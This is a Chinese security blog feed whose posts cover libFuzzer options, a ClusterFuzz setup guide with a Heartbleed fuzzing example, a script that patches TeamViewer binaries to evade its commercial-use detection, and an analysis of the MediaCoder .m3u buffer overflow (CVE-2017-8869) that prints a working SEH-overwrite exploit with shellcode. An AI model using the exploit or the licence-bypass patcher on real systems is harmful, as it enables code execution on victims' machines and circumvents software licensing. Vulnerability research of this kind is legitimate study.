SIGXFSZ.</td></tr><tr><td>handle_usr1</td><td>1</td><td>If 1, try to intercept SIGUSR1.</td></tr><tr><td>handle_usr2</td><td>1</td><td>If 1, try to intercept SIGUSR2.</td></tr><tr><td>lazy_counters</td><td>0</td><td>If 1, a performance optimization isenabled for the 8bit inline counters. Requires that libFuzzer successfully installs its SEGV handler</td></tr><tr><td>close_fd_mask</td><td>0</td><td>If 1, close stdout at startup; if 2, close stderr; if 3, close both. Be careful, this will also close e.g. stderr of asan.</td></tr><tr><td>detect_leaks</td><td>1</td><td>If 1, and if LeakSanitizer is enabled try to detect memory leaks during fuzzing (i.e. not only at shut down).</td></tr><tr><td>purge_allocator_interval</td><td>1</td><td>Purge allocator caches and quarantines every <N> seconds. When rss_limit_mb is specified (&gt;0), purging starts when RSS exceeds 50% of rss_limit_mb. Pass purge_allocator_interval=-1 to disable this functionality.</td></tr><tr><td>trace_malloc</td><td>0</td><td>If &gt;= 1 will print all mallocs/frees. If &gt;= 2 will also print stack traces.</td></tr><tr><td>rss_limit_mb</td><td>2048</td><td>If non-zero, the fuzzer will exit uponreaching this limit of RSS memory usage.</td></tr><tr><td>malloc_limit_mb</td><td>0</td><td>If non-zero, the fuzzer will exit if the target tries to allocate this number of Mb with one malloc call. If zero (default) same limit as rss_limit_mb is applied.</td></tr><tr><td>exit_on_src_pos</td><td>0</td><td>Exit if a newly found PC originates from the given source location. Example: -exit_on_src_pos=foo.cc:123. Used primarily for testing libFuzzer itself.</td></tr><tr><td>exit_on_item</td><td>0</td><td>Exit if an item with a given sha1 sum was added to the corpus. Used primarily for testing libFuzzer itself.</td></tr><tr><td>ignore_remaining_args</td><td>0</td><td>If 1, ignore all arguments passed after this one. Useful for fuzzers that need to do their own argument parsing.</td></tr><tr><td>focus_function</td><td>0</td><td>Experimental. Fuzzing will focus on inputs that trigger calls to this function. If -focus_function=auto and -data_flow_trace is used, libFuzzer will choose the focus functions automatically.</td></tr><tr><td>analyze_dict</td><td>0</td><td>Experimental</td></tr><tr><td>use_clang_coverage</td><td>0</td><td>Deprecated; don’t use</td></tr><tr><td>data_flow_trace</td><td>0</td><td>Experimental: use the data flow trace</td></tr><tr><td>collect_data_flow</td><td>0</td><td>Experimental: collect the data flow trace</td></tr></tbody></table><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>用libFuzzer搞事情  <a href="http://pwn4.fun/2017/07/15/%E7%94%A8libFuzzer%E6%90%9E%E4%BA%8B%E6%83%85/">http://pwn4.fun/2017/07/15/%E7%94%A8libFuzzer%E6%90%9E%E4%BA%8B%E6%83%85/</a></p><p>libFuzzer——编译链接</p><p><a href="https://i-m.dev/posts/20190831-143715.html">https://i-m.dev/posts/20190831-143715.html</a></p><p>libFuzzer –用于覆盖率指导的模糊测试的库</p><p><a href="https://releases.llvm.org/4.0.0/docs/LibFuzzer.html#startup-initialization">https://releases.llvm.org/4.0.0/docs/LibFuzzer.html#startup-initialization</a></p><p>libFuzzerTutorial </p><p><a href="https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md">https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md</a></p><p>fuzz实战之libfuzzer</p><p><a href="https://www.secpulse.com/archives/71898.html">https://www.secpulse.com/archives/71898.html</a></p><p>fuzzer-test-suite</p><p><a href="https://github.com/google/fuzzer-test-suite">https://github.com/google/fuzzer-test-suite</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> libFuzzer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clusterfuzz踩坑指南</title>
      <link href="2020/05/15/clusterfuzz%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97/"/>
      <url>2020/05/15/clusterfuzz%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>本文是初次使用clusterfuzz的踩坑指南，项目去年上半年刚开源，资料、博客都比较少，随时更新随时补充～</p><a id="more"></a><h3 id="clusterfuzz介绍"><a href="#clusterfuzz介绍" class="headerlink" title="clusterfuzz介绍"></a>clusterfuzz介绍</h3><p> google 之前推出了 <a href="https://github.com/google/oss-fuzz">OSS-Fuzz</a> 服务，用于给开源项目的进行免费的模糊测试服务，可自动在新版本代码提交后自动完成 <strong>测试-&gt;异常检测-&gt;issue登记-&gt;老版本issue回归及自动关闭</strong> 的功能。其实就是基于 ClusterFuzz ，技术图如下：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geunooukvij30nk0cl41e.jpg" alt="image-20200516222340997"></p><p>ClusterFuzz官方定义是“ClusterFuzz is a scalable fuzzing infrastructure which finds security and stability issues in software.”。 它的结构主要分为AppEngine 和 Bots pool两个部分，定义里的scalable 就是体现在这个Bots pool，原则上可以运行多个bots从而形成一个集群；Fuzz部分是在Bot中运行，主要是由第三方工具支持，如libFuzzer、AFL及其他的blackbox fuzzer，所以ClusterFuzz更是一个模糊测试的管理工具。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geunq5ua73j30hw0b0q3c.jpg" alt="img"></p><p><strong>App Engine：</strong>是提供Web接口访问，如访问crashes和统计分析等；也负责任务的调度，主要就是调度执行Bot</p><p><strong>Bot：</strong>这是测试的主要执行模块，涵盖模糊测试，语料库，分析等。</p><p>之前的clusterfuzz只能部署在Google Cloud 上，现在开源后也可以部署在本地。根据官方介绍，它具备如下功能：</p><ul><li>高度可扩展，谷歌的内部实例运行在超过 25000 台机器上</li><li>准确的去副本化（Accurate deduplication）</li><li>问题跟踪器的全自动错误归档和关闭</li><li>最小化测试用例</li><li>通过二分法回归查找</li><li>提供分析 fuzzer 性能和崩溃率的统计信息（不支持本地部署）</li><li>易于使用的 Web 界面，用于管理和查看崩溃</li><li>支持引导模糊（例如 libFuzzer 和 AFL）和黑盒模糊测试</li></ul><p>其基本的执行流程就是如下图所示</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geunumrd9qj30jp09qmy7.jpg" alt="image-20200516222925627"></p><p>基于此，参照一些教程和官方博客尝试在我的小mac上搭建跑一下。请注意，目前本地部署仅支持mac和linux，其中mac还被官方标注为“尝试性”的，可能会遇到意料之外的issue</p><h3 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h3><p>请注意：本项目大量依赖Google服务，强烈建议提前设置代理软件，大部分issue都与此有关，如果条件允许直接在路由器代理效果最好</p><p><strong>mac命令行代理</strong></p><p>给git设置全局代理</p><pre><code class="bash">git config --global http.proxy socks5://127.0.0.1:1080</code></pre><p>仅github代码库走代理，国内git库不走</p><pre><code class="bash">git config --global http.https://github.com.proxy socks5://127.0.0.1:1080</code></pre><p>移除上面设置的git代理</p><pre><code class="bash">git config --global --unset http.proxygit config --global --unset http.https://github.com.proxy</code></pre><p>终端全代理</p><pre><code class="bash">export http_proxy=http://127.0.0.1:1080;export https_proxy=http://127.0.0.1:1080;</code></pre><p><strong>路由代理</strong></p><p>买个华硕/网件路由刷老毛桃/潘多拉/梅林刷fancyss</p><pre><code class="http">https://github.com/hq450/fancyss</code></pre><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><h5 id="git源码"><a href="#git源码" class="headerlink" title="git源码"></a>git源码</h5><p>首先把源码先下载到本地</p><pre><code class="bash">git clone https://github.com/google/clusterfuzz</code></pre><p>官方建议使用我们代码的<a href="https://github.com/google/clusterfuzz/releases/latest">最新发行版</a>（而不是master分支）。您可以使用以下命令签出特定版本：</p><pre><code class="bash">git checkout tags/vX.Y.Z</code></pre><p>其中XYZ是发行版本（例如1.0.1）</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geuol766paj30w40eiq6m.jpg" alt="截屏2020-05-15 下午9.36.10"></p><h5 id="安装并配置Google-Cloud-SDK"><a href="#安装并配置Google-Cloud-SDK" class="headerlink" title="安装并配置Google Cloud SDK"></a>安装并配置Google Cloud SDK</h5><p>按照<a href="https://cloud.google.com/sdk/">在线说明</a>安装Google Cloud SDK ，mac 下可直接用解压后的 <code>install.sh</code> 脚本一键安装</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geuopf7sk3j30vs0eitbf.jpg" alt="image-20200516225901713"></p><p>这里请记得配置身份文件，否则最后运行时会报错。在<a href="https://console.cloud.google.com/apis/credentials/serviceaccountkey?_ga=2.81690135.165030320.1589549867-1464700725.1589549867">“创建服务帐号密钥”页面</a>里申请json文件，通过设定环境变量 GOOGLE_APPLICATION_CREDENTIALS，向您的应用代码提供身份验证凭据。将 [PATH] 替换为包含您服务帐号密钥的 JSON 文件的路径。此变量仅适用于当前的 shell 会话，因此，如果您打开新的会话，请重新设置该变量。</p><pre><code class="bash">export GOOGLE_APPLICATION_CREDENTIALS=&quot;/home/user/Downloads/[FILE_NAME].json&quot;</code></pre><p>确认命令行是否可用使用 gcloud 命令</p><pre><code class="bash">gcloud -v</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geuoy94l3cj30fu064q3t.jpg" alt="image-20200516230731150"></p><h5 id="使用依赖脚本安装依赖库"><a href="#使用依赖脚本安装依赖库" class="headerlink" title="使用依赖脚本安装依赖库"></a>使用依赖脚本安装依赖库</h5><p>该步骤请在clusterfuzz文件内执行，不然报错</p><pre><code class="bash">cd clusterfuzz</code></pre><p>利用官方自带的依赖脚本clusterfuzz/local/install_deps.bash进行安装，在该步骤运行时间长可能遇到的坑最多，究其根本还是代理问题，如果遇错请反复尝试本节开始的几个代理设置。</p><p>该依赖脚本需要homebrew，请自行安装。如果按照官方命令无法安装（被墙）可将命令行中地址复制到浏览器，打开后保存网页为后缀sh格式到本地运行</p><pre><code class="http">https://brew.sh/index_zh-cn</code></pre><p>如果顺利，经过漫长等待install_deps.bash运行成功后如下图所示</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geup36bgqkj30zo0pitpu.jpg" alt="截屏2020-05-16 下午6.47.09"></p><p>以上步骤看起来简单，但是实际安装过程会问题不断，github有人提供docker 镜像已成功打包，基于 ubuntu 16.04 系统。镜像中已运行完毕之前步骤，装好了所有依赖。镜像地址：<a href="https://hub.docker.com/r/chenhengjie123/clusterfuzz_local">https://hub.docker.com/r/chenhengjie123/clusterfuzz_local</a></p><p>可通过 <code>docker run -it --name clusterfuzz --network host chenhengjie123/clusterfuzz_local</code> 进入镜像运行环境，进入后续的步骤。clusterfuzz 的源代码存放在镜像的 /clusterfuzz 目录。</p><h5 id="加载pipenv"><a href="#加载pipenv" class="headerlink" title="加载pipenv"></a>加载pipenv</h5><p>运行<code>local/install_deps.bash</code>脚本后，通过运行以下命令激活pipenv：</p><pre><code class="bash">pipenv shell</code></pre><p>这将加载当前环境中的所有Python依赖项。</p><p>您可以通过运行以下命令来验证一切正常：</p><pre><code class="python">python butler.py --help</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geupgryiiaj30wi0fa77g.jpg" alt="截屏2020-05-16 下午6.52.27"></p><h4 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h4><p>主要分为两个部分，一个是本地服务器，另一个是本地机器人实例</p><h5 id="运行本地服务器"><a href="#运行本地服务器" class="headerlink" title="运行本地服务器"></a>运行本地服务器</h5><p>首次运行，添加 <code>--bootstrap</code> 进行各个数据的初始化。同时加上 <code>--skip-install-deps</code> 可跳过依赖安装（之前依赖包已装，可大大加快速度）</p><pre><code class="python">python butler.py run_server --bootstrap --skip-install-deps</code></pre><p>如果不是第一次运行，要去掉 <code>--bootstrap</code> 参数，不然数据会重置。</p><p>过程中会蹦提示需要安装java SDK</p><pre><code class="bash">brew cask install java</code></pre><p>开始可能需要几秒钟。一旦看到类似的输出行<code>INFO  admin_server.py:] Starting admin server</code>，就可以通过导航到<a href="http://localhost:9000/">http://localhost:9000</a>来看到Web界面。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geups3cl4xj31ja0swtfz.jpg" alt="image-20200516233611704"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geupsm3z3mj31fm0ihacn.jpg" alt="截屏2020-05-16 下午8.52.57"></p><h5 id="运行执行机器人"><a href="#运行执行机器人" class="headerlink" title="运行执行机器人"></a>运行执行机器人</h5><p>官方命令：</p><pre><code class="python">python butler.py run_bot --name my-bot /path/to/my-bot</code></pre><p>其中 my-bot 可以替换为喜欢的名称。 fzy-bot`</p><pre><code class="python">python butler.py run_bot --name fzy-bot `pwd`/fzy-bot</code></pre><p>执行成功后，可在前一步的管理员界面看到机器人状态。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevsgtyq2jj31d60andge.jpg" alt="截屏2020-05-17 下午1.49.22"></p><p>可通过</p><pre><code class="bash">tail -f `pwd`/fzy-bot/bot.log</code></pre><p>查看机器人实时日志输出。</p><p>至此clusterfuzz已经搭建起来了，下面的任务就是跑一个实际的例子看看真实效果</p><h4 id="实例测试–OpenSSL心脏滴血"><a href="#实例测试–OpenSSL心脏滴血" class="headerlink" title="实例测试–OpenSSL心脏滴血"></a>实例测试–OpenSSL心脏滴血</h4><p>LibFuzzer和AFL需要使用Clang编译器中的工具,使用Clang <strong>6.0</strong>或更高版本提供的功能。要获得Clang构建，可以从<a href="https://llvm.org/builds/">快照页面</a>（Windows）下载它，或按照<a href="https://apt.llvm.org/">apt页面</a>（Ubuntu / Debian）上的说明进行操作。否则，您可以从<a href="http://releases.llvm.org/download.html">发行版页面</a>下载Clang发行<a href="http://releases.llvm.org/download.html">版，</a>或使用包管理器安装一个Clang发行<a href="http://releases.llvm.org/download.html">版</a>。我们将在示例中将这些编译器称为<code>$CC</code>和<code>$CXX</code>。在环境中进行设置，以便您可以复制并粘贴示例命令：</p><pre><code class="bash">export CC=/path/to/clangexport CXX=/path/to/clang++</code></pre><p>如果是用的mac，直接装一个xcode或者xcode的命令行工具就行</p><p>Command Line Tools安装：</p><pre><code class="bash">xcode-select --install </code></pre><p>在安装完clang后，按照官方的教程开始安装OpenSSL的心脏滴血示例</p><pre><code class="bash"># 下载并解压包含这个漏洞的 OpenSSL :curl -O https:*//www.openssl.org/source/openssl-1.0.1f.tar.gztar xf openssl-1.0.1f.tar.gz# 使用 AScan 和 fuzzer 插桩编译 OpenSSL:cd openssl-1.0.1f/./config    </code></pre><p>注意，这里有个小坑，如果使用mac用./config后面clang时会出错，此处编译环境切记使用</p><pre><code class="bash">./Configure darwin64-x86_64-cc</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevsqs0wppj30wm0ic43k.jpg" alt="截屏2020-05-17 下午4.18.41"></p><p>继续向下走</p><pre><code class="bash"># 注意：$CC 必须指向 clang 二进制文件。简单地说，按照这个命令来写就对了make CC=&quot;$CC -g -fsanitize=address,fuzzer-no-link&quot;cd ..</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevswbusfzj30w20co419.jpg" alt="截屏2020-05-17 下午5.46.52"></p><pre><code class="bash"># 下载 fuzz target 和它的数据依赖:curl -O https://raw.githubusercontent.com/google/clusterfuzz/master/docs/setting-up-fuzzing/heartbleed/handshake-fuzzer.cccurl -O https://raw.githubusercontent.com/google/clusterfuzz/master/docs/setting-up-fuzzing/heartbleed/server.keycurl -O https://raw.githubusercontent.com/google/clusterfuzz/master/docs/setting-up-fuzzing/heartbleed/server.pem</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevsulwz8uj30wk0byq62.jpg" alt="截屏2020-05-17 下午5.46.34"></p><pre><code class="bash"># 编译可用于 ClusterFuzz 的 OpenSSL fuzz target （$CXX 需要指向一个 clang++ 二进制文件）:$CXX -g handshake-fuzzer.cc -fsanitize=address,fuzzer openssl-1.0.1f/libssl.a \  openssl-1.0.1f/libcrypto.a -std=c++17 -Iopenssl-1.0.1f/include/ -lstdc++fs   \  -ldl -lstdc++ -o handshake-fuzzerzip openssl-fuzzer-build.zip handshake-fuzzer server.key server.pem</code></pre><p>这一步对于mac是个坑，会报错ld: library not found for -lstdc++fs</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevsy9jf2pj31a20420tp.jpg" alt="image-20200517221128743"></p><p>经过仔细地搜索发现在xcode10之后，苹果官方就已经取消了对stdc++包的支持</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevt1hj96cj30iq02cwep.jpg" alt="image-20200517221435111"></p><p>网上有论坛中提供一个思路，把开发者环境退回xcode10之前的一个系统版本（10.9）来回避这个问题，现版本为catalina（10.15） </p><p><a href="https://stackoverflow.com/questions/53287975/pybind11-doesnt-work-or-c-doesnt-compile-after-upgrading-to-mojave-lstdc">升级到Mojave后，Pybind11无法正常工作或C ++无法编译：-lstdc ++未找到</a></p><pre><code class="bash">export MACOSX_DEPLOYMENT_TARGET=10.9</code></pre><p>退回后再次运行，会报错**’~path’ is unavailable: introduced in macOS 10.15**</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gevt7xhfkdj31ay0k00x5.jpg" alt="image-20200517222046241"></p><p>经过查阅无法从10.15生成可以针对/运行于10.15之前的MacOS版本的可执行文件</p><p><a href="https://codebug.vip/questions-1992980.htm">使用C ++ 17 std :: filesystem是否需要MacOS 1015？ （Xcode 111）</a></p><p>这样就完全卡死了，新版本不支持包，老版本无法构建。正在寻找新的办法中</p><p>//正在做，待补充ing</p><p>参考资料：</p><p>谷歌开源模糊测试工具 ClusterFuzz 尝鲜记录 (进行中)  <a href="https://testerhome.com/topics/18171">https://testerhome.com/topics/18171</a></p><p>ClusterFuzz官方指南 <a href="https://google.github.io/clusterfuzz/getting-started/local-instance/">https://google.github.io/clusterfuzz/getting-started/local-instance/</a></p><p>开源工具ClusterFuzz的试用和解读 <a href="https://www.sohu.com/a/296397615_468741">https://www.sohu.com/a/296397615_468741</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> clusterfuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac系统Teamview去除商业版限制</title>
      <link href="2020/05/08/teamview%E5%8E%BB%E9%99%A45%E5%88%86%E9%92%9F/"/>
      <url>2020/05/08/teamview%E5%8E%BB%E9%99%A45%E5%88%86%E9%92%9F/</url>
      
        <content type="html"><![CDATA[<p>用来去除macos上Teamview的商业版限制</p><a id="more"></a><p>最近几个月天天用Teamview，不出所料的被商业版了。扒了扒网上的方法，重装清注册表的，还有就是win下那个换ID的启动器可惜mac用不了，在github上找到一个TeamViewer ID Changer for MAC OS挺长时间没更新了，里面文件的位置都变了也用不了，简单改了改现在的最新版本可以使用，使用root用户运行后重启登陆就可以了。</p><pre><code class="python">#!/usr/bin/env python #coding:utf-8import sysimport osimport globimport platformimport reimport randomimport stringprint(&#39;&#39;&#39;--------------------------------TeamViewer ID Changer for MAC OS--------------------------------&#39;&#39;&#39;)if platform.system() != &#39;Darwin&#39;:    print(&#39;This script can be run only on MAC OS.&#39;)    sys.exit();if os.geteuid() != 0:    print(&#39;This script must be run form root.&#39;)    sys.exit();if os.environ.has_key(&#39;SUDO_USER&#39;):    USERNAME = os.environ[&#39;SUDO_USER&#39;]    if USERNAME == &#39;root&#39;:       print(&#39;Can not find user name. Run this script via sudo from regular user&#39;)       sys.exit();else:    print(&#39;Can not find user name. Run this script via sudo from regular user&#39;)    sys.exit();HOMEDIRLIB = &#39;/Users/&#39; + USERNAME  + &#39;/library/preferences/&#39;GLOBALLIB  =  &#39;/library/preferences/&#39;CONFIGS = []# Find config filesdef listdir_fullpath(d):    return [os.path.join(d, f) for f in os.listdir(d)]for file in listdir_fullpath(HOMEDIRLIB):    if &#39;teamviewer&#39;.lower() in file.lower():        CONFIGS.append(file)if not CONFIGS:    print (&#39;&#39;&#39;There is no TemViewer configs found.Maybe you have deleted it manualy or never run TeamViewer after installation.Nothing to delete.&#39;&#39;&#39;)# Delete config fileselse:    print(&quot;Configs found:\n&quot;)    for file in CONFIGS:        print file    print(&#39;&#39;&#39;This files will be DELETED permanently.All TeamViewer settings will be lost&#39;&#39;&#39;)    raw_input(&quot;Press Enter to continue or CTR+C to abort...&quot;)    for file in CONFIGS:        try:            os.remove(file)        except:            print(&quot;Cannot delete config files. Permission denied?&quot;)            sys.exit();    print(&quot;Done.&quot;)# Find binaryesTMBINARYES = [&#39;/Applications/TeamViewer.app/Contents/MacOS/TeamViewer&#39;,&#39;/Applications/TeamViewer.app/Contents/MacOS/TeamViewer_Service&#39;,&#39;/Applications/TeamViewer.app/Contents/MacOS/TeamViewer_Desktop&#39;,]for file in TMBINARYES:    if os.path.exists(file):        pass    else:        print(&quot;File not found: &quot; + file)        print (&quot;Install TeamViewer correctly&quot;)        sys.exit();# Patch filesdef idpatch(fpath,platf,serial):    file = open(fpath, &#39;r+b&#39;)    binary = file.read()    PlatformPattern = &quot;IOPlatformExpert.&#123;6&#125;&quot;    SerialPattern =  &quot;IOPlatformSerialNumber%s%s%sUUID&quot;    binary = re.sub(PlatformPattern, platf, binary)    binary = re.sub(SerialPattern % (chr(0), &quot;[0-9a-zA-Z]&#123;8,8&#125;&quot;, chr(0)), SerialPattern%(chr(0), serial, chr(0)), binary)    file = open(fpath,&#39;wb&#39;).write(binary)    return Truedef random_generator(size=8, chars=string.ascii_uppercase + string.digits):    return &#39;&#39;.join(random.choice(chars) for _ in range(size))RANDOMSERIAL = random_generator()RANDOMPLATFORM = &quot;IOPlatformExpert&quot; + random_generator(6)for file in TMBINARYES:        try:            idpatch(file,RANDOMPLATFORM,RANDOMSERIAL)        except:            print &quot;Error: can not patch file &quot; + file            print &quot;Wrong version?&quot;            sys.exit();print &quot;PlatformDevice: &quot; + RANDOMPLATFORMprint &quot;PlatformSerial: &quot; + RANDOMSERIALprint(&#39;&#39;&#39;ID changed sucessfully.!!! Restart computer before using TeamViewer !!!!&#39;&#39;&#39;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MEDIACODER .M3U缓冲区溢出漏洞（CVE-2017-8869）</title>
      <link href="2020/04/30/MEDIACODER%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/04/30/MEDIACODER%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>本文是针对Mediacoder缓冲区溢出漏洞的简要分析文章</p><a id="more"></a><h3 id="背景概述"><a href="#背景概述" class="headerlink" title="背景概述"></a>背景概述</h3><p>本来是浏览学长博客 <a href="https://whereisk0shl.top/post/2018-06-23">MEDIACODER 0.8.43.5852 - .M3U缓冲区溢出漏洞</a> 进行的漏洞分析过程</p><p>实验环境为：</p><p>Windows xp sp3</p><p>Windbg</p><p>IDA pro</p><p>OD</p><p>MEDIACODER 软件下载：<a href="https://www.exploit-db.com/apps/bab45ceeba55cbe48a49ead4e6787fd0-MediaCoder-0.8.45.5852.exe">https://www.exploit-db.com/apps/bab45ceeba55cbe48a49ead4e6787fd0-MediaCoder-0.8.45.5852.exe</a></p><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>原文提供的poc如下所示</p><pre><code class="python">#!/usr/bin/pythontotal_buf = 5000shellcode = (&quot;\x89\xe1\xda\xcc\xd9\x71\xf4\x5e\x56\x59\x49\x49\x49\x49\x43&quot;&quot;\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34&quot;&quot;\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41&quot;&quot;\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58&quot;&quot;\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38\x4c\x42\x55\x50&quot;&quot;\x45\x50\x35\x50\x53\x50\x4c\x49\x4b\x55\x46\x51\x59\x50\x55&quot;&quot;\x34\x4c\x4b\x30\x50\x56\x50\x4c\x4b\x31\x42\x54\x4c\x4c\x4b&quot;&quot;\x46\x32\x44\x54\x4c\x4b\x32\x52\x47\x58\x34\x4f\x58\x37\x50&quot;&quot;\x4a\x47\x56\x50\x31\x4b\x4f\x4e\x4c\x37\x4c\x43\x51\x53\x4c&quot;&quot;\x53\x32\x36\x4c\x51\x30\x59\x51\x58\x4f\x34\x4d\x35\x51\x48&quot;&quot;\x47\x4a\x42\x5a\x52\x36\x32\x46\x37\x4c\x4b\x56\x32\x52\x30&quot;&quot;\x4c\x4b\x50\x4a\x57\x4c\x4c\x4b\x50\x4c\x52\x31\x32\x58\x4d&quot;&quot;\x33\x30\x48\x33\x31\x38\x51\x46\x31\x4c\x4b\x50\x59\x31\x30&quot;&quot;\x33\x31\x49\x43\x4c\x4b\x30\x49\x55\x48\x5a\x43\x36\x5a\x47&quot;&quot;\x39\x4c\x4b\x30\x34\x4c\x4b\x45\x51\x39\x46\x36\x51\x4b\x4f&quot;&quot;\x4e\x4c\x59\x51\x48\x4f\x44\x4d\x53\x31\x58\x47\x56\x58\x4d&quot;&quot;\x30\x33\x45\x4b\x46\x54\x43\x43\x4d\x4c\x38\x47\x4b\x53\x4d&quot;&quot;\x37\x54\x54\x35\x5a\x44\x51\x48\x4c\x4b\x30\x58\x57\x54\x35&quot;&quot;\x51\x4e\x33\x55\x36\x4c\x4b\x54\x4c\x30\x4b\x4c\x4b\x56\x38&quot;&quot;\x45\x4c\x43\x31\x58\x53\x4c\x4b\x55\x54\x4c\x4b\x35\x51\x48&quot;&quot;\x50\x4b\x39\x51\x54\x56\x44\x46\x44\x51\x4b\x31\x4b\x43\x51&quot;&quot;\x46\x39\x30\x5a\x46\x31\x4b\x4f\x4d\x30\x51\x4f\x51\x4f\x31&quot;&quot;\x4a\x4c\x4b\x52\x32\x4a\x4b\x4c\x4d\x51\x4d\x52\x4a\x43\x31&quot;&quot;\x4c\x4d\x4c\x45\x4f\x42\x43\x30\x55\x50\x33\x30\x30\x50\x33&quot;&quot;\x58\x56\x51\x4c\x4b\x32\x4f\x4d\x57\x4b\x4f\x48\x55\x4f\x4b&quot;&quot;\x4a\x50\x38\x35\x4e\x42\x31\x46\x53\x58\x49\x36\x5a\x35\x4f&quot;&quot;\x4d\x4d\x4d\x4b\x4f\x4e\x35\x47\x4c\x43\x36\x33\x4c\x35\x5a&quot;&quot;\x4b\x30\x4b\x4b\x4d\x30\x44\x35\x33\x35\x4f\x4b\x31\x57\x44&quot;&quot;\x53\x52\x52\x52\x4f\x33\x5a\x33\x30\x36\x33\x4b\x4f\x58\x55&quot;&quot;\x42\x43\x45\x31\x52\x4c\x35\x33\x56\x4e\x55\x35\x54\x38\x32&quot;&quot;\x45\x53\x30\x41\x41&quot;)junk = &quot;http:// &quot;junk += &quot;A&quot;*784nseh = &quot;\xEB\x06\x90\x90&quot;seh = &quot;\x38\x78\x01\x66&quot; # PPR - 0x66017838 - libiconv-2.dllevil = junk + nseh + sehevil += &quot;\x90&quot;*50 + shellcodeevil += &quot;\x90&quot;*3000file = open(&quot;evil.m3u&quot;, &quot;wb&quot;)file.write (evil)file.close()</code></pre><p>双击后生成一个m3u文件，用<code>MediaCoder</code>打开，触发崩溃。</p><p>使用Windbg附加程序，发现拖入文件后断在了004306b5位置</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebtphub73j30l008sgm9.jpg" alt="image-20200430152618774"></p><p>再次执行出现414141，看来到了被覆盖的跳转位置，这个poc里位置需要再调一下</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebtw6ngtzj30o406tjs6.jpg" alt="image-20200430153247696"></p><p>参考教程中通过windbg的kb命令，回溯栈信息，还能看到入手点的上层调用函数，如下图。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebtzynq5zj30kz07mmy0.jpg" alt="image-20200430153625478"></p><p>但是我在分析时，kb命令获取的信息却不太一样，应该是利用脚本需要根据利用环境进行调整的原因。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebu0rlqgkj30k208rq3d.jpg" alt="image-20200430153711431"></p><p>看来没办法像原博一样，还是从第一次报错的004306b5位置开始查找原因吧</p><p>放在IDA里看一下这一部分，好像是一个死循环啊</p><pre><code class="assembly">.text:004306B0 loc_4306B0:                             ; CODE XREF: sub_430620+9Bj.text:004306B0                 mov     al, [ecx].text:004306B2                 lea     ecx, [ecx+1].text:004306B5                 mov     [edx+ecx-1], al.text:004306B9                 test    al, al.text:004306BB                 jnz     short loc_4306B0</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geby5e9w3wj30at0ehaai.jpg" alt="image-20200430180002430"></p><p>我们可以看出来这一部分函数a3作为畸形字符串传入，在里面将a3交给v5，随后v5在do while循环中进行连续赋值，读取赋值的终止条件是取到的值为0，并没有对长度进行限制,那也就是说只要文档里有字符就会一一读出来，很明显有安全漏洞啊</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebyiaspcpj30ky05dwek.jpg" alt="image-20200430181226364"></p><p>我们在OllyDbg里进行进一步的动态调试，可知读取的内容位置起始为12f380</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gebyo9zxnmj30h803vt8q.jpg" alt="image-20200430181811372"></p><p>最终报错是因为构造的文件内容太长，把这段堆栈给完全填满了，mov指令在填充下一个时访问到了不可访问的位置（130000），最终报错。</p><p><img 